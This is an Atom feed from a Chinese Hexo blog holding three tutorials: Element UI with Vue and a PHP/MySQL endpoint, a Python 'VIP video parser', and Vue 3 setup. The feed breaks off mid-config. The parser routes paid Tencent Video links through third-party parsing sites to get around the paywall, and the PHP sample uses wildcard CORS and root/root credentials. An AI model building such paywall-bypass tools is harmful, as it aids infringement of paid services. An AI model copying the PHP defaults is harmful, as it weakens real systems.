<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>baiQstar的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-17T02:41:23.342Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>白易安</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>二十八，html引用Element2</title>
    <link href="http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/"/>
    <id>http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/</id>
    <published>2023-12-17T01:37:52.000Z</published>
    <updated>2023-12-17T02:41:23.342Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，html引用element2组件"><a href="#1，html引用element2组件" class="headerlink" title="1，html引用element2组件"></a>1，html引用element2组件</h4><p>element2组件的地址为： <a href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a></p><p>将index.css,vue.js,index.js三个文件下载到本地并引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;./element/index.css&quot;&gt;</span><br><span class="line">&lt;script src=&quot;./element/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;./element/index.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>下载地址分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://element.eleme.cn/#/zh-CN/component/installation</span><br><span class="line">https://unpkg.com/vue@2/dist/vue.js</span><br><span class="line">https://unpkg.com/element-ui/lib/index.js</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>中进行设置布局：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: function() &#123;</span><br><span class="line">        return &#123; visible: false &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>并且在<strong>body</strong>标签中引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;el-button @click=&quot;visible = true&quot;&gt;Button&lt;/el-button&gt;</span><br><span class="line">    &lt;el-dialog :visible.sync=&quot;visible&quot; title=&quot;Hello world&quot;&gt;</span><br><span class="line">      &lt;p&gt;Try Element&lt;/p&gt;</span><br><span class="line">    &lt;/el-dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>演示效果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171041725.png" alt="image-20231217104115234"></p><h4 id="2，方法进行数据绑定"><a href="#2，方法进行数据绑定" class="headerlink" title="2，方法进行数据绑定"></a>2，方法进行数据绑定</h4><p>（1）插值表达式：，将表达式的值在View中显示出来</p><p>（2）v-bind：将标签的属性绑定到指定的变量上。简写方式： :属性名&#x3D;’变量名’</p><p>在<strong>script</strong>中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data: function () &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                visible: false,</span><br><span class="line">                text:&#x27;首页&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在<strong>body</strong>中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123;text&#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171004376.png" alt="image-20231217100420293"></p><p>实现点击引用不同的页面效果：</p><p>在<strong>body</strong>中设置点击执行方法和引用标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-menu-item @click=&quot;router&quot;&gt;用户列表&lt;/el-menu-item&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe :src=&quot;iframeSrc&quot; frameborder=&quot;false&quot;</span><br><span class="line">                        style=&quot;top:80px;left: 120px;width: 100%;height: 500px&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>中设置变量和执行的改变变量值的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iframeSrc: &#x27;&#x27;,</span><br><span class="line"> methods: &#123;</span><br><span class="line">                    router() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin.php&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    router2() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin2.php&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>就可以实现点击不同的标签，会改变为不同引用页面的方法。</p><h4 id="3，axios进行数据通信"><a href="#3，axios进行数据通信" class="headerlink" title="3，axios进行数据通信"></a>3，axios进行数据通信</h4><p>先下载axios.min.js到本地并进行引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://unpkg.com/axios/dist/axios.min.js</span><br><span class="line">&lt;!-- 引入axios库 --&gt;</span><br><span class="line">  &lt;script src=&quot;./element/axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>写出执行的php页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">header(&#x27;content-type:text/html; charset= utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">$link = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;hysxm&quot;);</span><br><span class="line"></span><br><span class="line">$tableData = array();</span><br><span class="line">//从表中查询数据</span><br><span class="line">$select = &quot;SELECT * FROM users where isadm=0 &quot;;</span><br><span class="line">$result1 = $link-&gt;query($select);</span><br><span class="line">if ($result1-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    // 输出数据</span><br><span class="line">    while ($row = $result1-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $tableData[] = $row;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$link-&gt;close();</span><br><span class="line"></span><br><span class="line">$requestPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: application/json&#x27;);</span><br><span class="line">echo json_encode($tableData); // 输出所有用户数据的JSON表示</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在table标签中引用tableData变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%; font-size:20px;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>设置变量并和页面刷新前执行的方法，用axios发送请求获取返回数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tableData: [],</span><br><span class="line">get_data: function () &#123;</span><br><span class="line">          this.menu_name = &quot;用户列表&quot;;</span><br><span class="line">          axios.get(&#x27;http://127.0.0.1/user/quer_user.php&#x27;) // 执行注销链接的请求</span><br><span class="line">            .then(response =&gt; &#123;</span><br><span class="line">              this.tableData = response.data; // 将响应数据存储在Vue实例的数据中</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(error =&gt; &#123;</span><br><span class="line">              alert(&quot;获取数据失败！&quot;); // 在请求失败时显示提示信息</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        mounted() &#123;</span><br><span class="line">        this.get_data();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>页面效果:</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171028821.png" alt="image-20231217102828547"></p><h4 id="4-vite设置局域网访问"><a href="#4-vite设置局域网访问" class="headerlink" title="4,vite设置局域网访问"></a>4,vite设置局域网访问</h4><p>cmd进入项目的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx vite --host 0.0.0.0</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171031585.png" alt="image-20231217103124483"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171031098.png" alt="image-20231217103138604"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，html引用element2组件&quot;&gt;&lt;a href=&quot;#1，html引用element2组件&quot; class=&quot;headerlink&quot; title=&quot;1，html引用element2组件&quot;&gt;&lt;/a&gt;1，html引用element2组件&lt;/h4&gt;&lt;p&gt;elemen</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十七，python爬虫-VIP视频解析器</title>
    <link href="http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <id>http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/</id>
    <published>2023-12-11T13:48:34.000Z</published>
    <updated>2023-12-11T14:07:29.302Z</updated>
    
    <content type="html"><![CDATA[<p>​用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下：</p><h4 id="1，导入该程序所需要的python组件库"><a href="#1，导入该程序所需要的python组件库" class="headerlink" title="1，导入该程序所需要的python组件库"></a>1，导入该程序所需要的python组件库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image,ImageTk</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">import webbrowser</span><br></pre></td></tr></table></figure><h4 id="2，制作一个居中的窗口"><a href="#2，制作一个居中的窗口" class="headerlink" title="2，制作一个居中的窗口"></a>2，制作一个居中的窗口</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">root=Tk()</span><br><span class="line"><span class="comment"># 窗口加标题</span></span><br><span class="line">root.title(<span class="string">&#x27;VIP视频解析器&#x27;</span>)</span><br><span class="line"><span class="comment"># 设置窗口大小</span></span><br><span class="line">root.geometry(<span class="string">&quot;500x470&quot;</span>)</span><br><span class="line"><span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line">screen_width = root.winfo_screenwidth()</span><br><span class="line">screen_height = root.winfo_screenheight()</span><br><span class="line"><span class="comment"># 计算窗口在屏幕上的位置（居中）</span></span><br><span class="line">x_pos = <span class="built_in">int</span>((screen_width / <span class="number">2</span>) - (<span class="number">500</span> / <span class="number">2</span>))</span><br><span class="line">y_pos = <span class="built_in">int</span>((screen_height / <span class="number">2</span>) - (<span class="number">470</span> / <span class="number">2</span>))</span><br><span class="line"><span class="comment"># 使用geometry()函数设置窗口的位置和大小</span></span><br><span class="line">root.geometry(<span class="string">&quot;+&#123;&#125;+&#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_pos, y_pos))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直打开窗口</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><h4 id="3-在该代码文件的同一文件夹下有一张名为fengmian-png的图片，用相对路径引用并放到窗口上"><a href="#3-在该代码文件的同一文件夹下有一张名为fengmian-png的图片，用相对路径引用并放到窗口上" class="headerlink" title="3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上"></a>3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 窗口中加上一个图片</span></span><br><span class="line">image=Image.<span class="built_in">open</span>(<span class="string">&#x27;./fengmian.png&#x27;</span>)</span><br><span class="line"><span class="comment"># 转换为PhotoImage对象，避免图像丢失问题  </span></span><br><span class="line">img = ImageTk.PhotoImage(image)  </span><br><span class="line"><span class="comment"># 创建一个Label，并设置图片  </span></span><br><span class="line">lab_img = Label(root, image=img)  </span><br><span class="line">lab_img.image = img  <span class="comment"># 避免图像丢失问题  </span></span><br><span class="line">lab_img.pack()</span><br></pre></td></tr></table></figure><h4 id="4-加上选择解析路径的标签"><a href="#4-加上选择解析路径的标签" class="headerlink" title="4,加上选择解析路径的标签"></a>4,加上选择解析路径的标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chooce_frm=LabelFrame(root)</span><br><span class="line">chooce_frm.pack(pady=10,fill=&#x27;both&#x27;)</span><br><span class="line">jiexi_lab=Label(chooce_frm, text=&#x27;选择路径：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)</span><br><span class="line"># 设置单选变量</span><br><span class="line">num_chooce=IntVar()</span><br><span class="line"># 设置默认选中路线1</span><br><span class="line">num_chooce.set(1)</span><br><span class="line"># 设置三个单选按钮</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;1号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=1).pack(side=&#x27;left&#x27;)</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;2号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=2).pack(side=&#x27;left&#x27;)</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;3号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=3).pack(side=&#x27;left&#x27;)</span><br></pre></td></tr></table></figure><h4 id="5，加上输入要解析的视频的地址的标签"><a href="#5，加上输入要解析的视频的地址的标签" class="headerlink" title="5，加上输入要解析的视频的地址的标签"></a>5，加上输入要解析的视频的地址的标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url_frm=LabelFrame(root)</span><br><span class="line">url_frm.pack(pady=10,fill=&#x27;both&#x27;)</span><br><span class="line">bofang_lab=Label(url_frm, text=&#x27;播放地址：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)</span><br><span class="line"># 设置输入变量</span><br><span class="line">input_var=StringVar()</span><br><span class="line">input_ent=Entry(url_frm,width=100,relief=&#x27;flat&#x27;,textvariable=input_var)</span><br><span class="line">input_ent.pack(side=&#x27;left&#x27;,fill=&#x27;both&#x27;)</span><br></pre></td></tr></table></figure><h4 id="6，设置解析按钮"><a href="#6，设置解析按钮" class="headerlink" title="6，设置解析按钮"></a>6，设置解析按钮</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">btn_jiexi=Button(root,command=parser,text=&#x27;解析视频&#x27;,bg=&#x27;#00BFFF&#x27;,fg=&#x27;#FFFFFF&#x27;,activebackground=&#x27;#00BFFF&#x27;,activeforeground=&#x27;#00BFFF&#x27;,font=(&#x27;微软雅黑&#x27;,15),relief=&#x27;flat&#x27;)</span><br><span class="line">btn_jiexi.pack(fill=&#x27;both&#x27;)</span><br></pre></td></tr></table></figure><h4 id="7，写出点击按钮所执行的方法"><a href="#7，写出点击按钮所执行的方法" class="headerlink" title="7，写出点击按钮所执行的方法"></a>7，写出点击按钮所执行的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 点击解析按钮，进行解析</span><br><span class="line">def parser():</span><br><span class="line">    num=num_chooce.get()</span><br><span class="line">    base_url=input_var.get()</span><br><span class="line">    if not base_url:</span><br><span class="line">        message=&#x27;视频播放地址不能为空，请重新输入！&#x27;</span><br><span class="line">        open_new_window(message)</span><br><span class="line">    else:</span><br><span class="line">        if num==1:</span><br><span class="line">            link=&#x27;https://www.8090g.cn/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        elif num==2:</span><br><span class="line">            link=&#x27;https://www.8090.la/8090/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        elif num==3:</span><br><span class="line">            link=&#x27;https://jx.xmflv.com/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        else:</span><br><span class="line">            message=&#x27;路线选择错误，请重新选择路线！&#x27;</span><br><span class="line">            open_new_window(message)</span><br></pre></td></tr></table></figure><p>其中<a href="https://www.8090g.cn/?url=%E6%98%AF%E8%A7%A3%E6%9E%90%E5%9C%B0%E5%9D%80">https://www.8090g.cn/?url=是解析地址</a><br><a href="https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html%E6%98%AF%E8%A7%A3%E6%9E%90%E5%89%8D%E7%9A%84%E5%9C%B0%E5%9D%80">https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析前的地址</a><br><a href="https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html%E6%98%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E7%9A%84%E5%9C%B0%E5%9D%80">https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析后的地址</a></p><h4 id="8，写出在主窗口上弹出新窗口的方法"><a href="#8，写出在主窗口上弹出新窗口的方法" class="headerlink" title="8，写出在主窗口上弹出新窗口的方法"></a>8，写出在主窗口上弹出新窗口的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在主窗口上弹出新窗口</span><br><span class="line">def open_new_window(message):</span><br><span class="line">    new_window = Toplevel(root)</span><br><span class="line">    new_window.title(&quot;vip视频解析器&quot;)</span><br><span class="line">    new_window.geometry(&quot;350x100+650+400&quot;)</span><br><span class="line">    label = Label(new_window, text=message)</span><br><span class="line">    label.pack()</span><br></pre></td></tr></table></figure><h4 id="9，写出获取解析后的视频地址并打开的方法"><a href="#9，写出获取解析后的视频地址并打开的方法" class="headerlink" title="9，写出获取解析后的视频地址并打开的方法"></a>9，写出获取解析后的视频地址并打开的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 获取解析后的视频地址并打开</span><br><span class="line">def jieixi(link):</span><br><span class="line">    response=requests.get(link)</span><br><span class="line">    content=response.text</span><br><span class="line">    tree=etree.HTML(content)</span><br><span class="line">    url=tree.xpath(&#x27;//iframe[@id=&quot;WANG&quot;]/@src&#x27;)[0]</span><br><span class="line">    webbrowser.open(url)</span><br></pre></td></tr></table></figure><h4 id="10，运行效果："><a href="#10，运行效果：" class="headerlink" title="10，运行效果："></a>10，运行效果：</h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112159140.png" alt="image-20231211215957932"></p><p>VIP视频地址：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112200307.png" alt="image-20231211220053194"></p><p>复制地址栏中的地址，输入后点击解析视频</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112201923.png" alt="image-20231211220150649"></p><p>解析成功，自动打开浏览器观看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112205198.png" alt="image-20231211220528128"></p><p>python爬虫-VIP视频解析器制作完成！</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下：&lt;/p&gt;
&lt;h4 id=&quot;1，导入该程序所需要的python组件库&quot;&gt;&lt;a href=&quot;#1，导入该程序所需要的python</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十六，VUE的使用</title>
    <link href="http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-11T13:33:05.000Z</published>
    <updated>2023-12-11T13:43:23.768Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，要使用vue前先下载node-js"><a href="#1，要使用vue前先下载node-js" class="headerlink" title="1，要使用vue前先下载node.js"></a>1，要使用vue前先下载node.js</h4><p>下载地址为：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v  </span><br><span class="line">检查是否已安装node.js</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112141387.png" alt="image-20231211205438106"></p><h4 id="2，创建vue项目"><a href="#2，创建vue项目" class="headerlink" title="2，创建vue项目"></a>2，创建vue项目</h4><p>cmd命令窗口进入一个放置vue项目的文件夹，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm create vue@latest</span><br></pre></td></tr></table></figure><p>若没有vue环境则会自动安装，然后定义项目的名字。接下来的就都一直按回车键确定就好了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112134407.png" alt="img"></p><p>底部会出现3行提示，跟着它敲然后回车就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd you_project_name//进入项目</span><br><span class="line">npm install//初始化项目</span><br><span class="line">npm run dev//运行服务</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112135020.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112135122.png" alt="img"></p><p>复制地址：<a href="http://localhost:5173/">http://localhost:5173/</a> 去浏览器打开，就可以跳转到vue的界面了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112138536.png" alt="img"></p><p>表示项目创建成功！</p><h4 id="3-Vue3项目中引入ElementUI"><a href="#3-Vue3项目中引入ElementUI" class="headerlink" title="3.Vue3项目中引入ElementUI"></a>3.Vue3项目中引入ElementUI</h4><p>​ElementUI是一个强大的PC端UI组件框架，它不依赖于vue，但是却是当前和vue配合做项目开发的一个比较好的ui框架，其包含了布局（layout)，容器（container）等各类组件，基本上能满足日常网站的搭建开发。</p><p>​ElementUI组件地址：<a href="https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95">https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95</a></p><p>首先安装ElementUI的使用库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install element-plus --save</span><br></pre></td></tr></table></figure><p>​在vue3中按需引入ElementUI，需要使用其他的插件辅助，需要安装unplugin-vue-components 和 unplugin-auto-import这两款插件；安装方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br></pre></td></tr></table></figure><p>还需要在vite.config.js文件该为如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // ...</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: 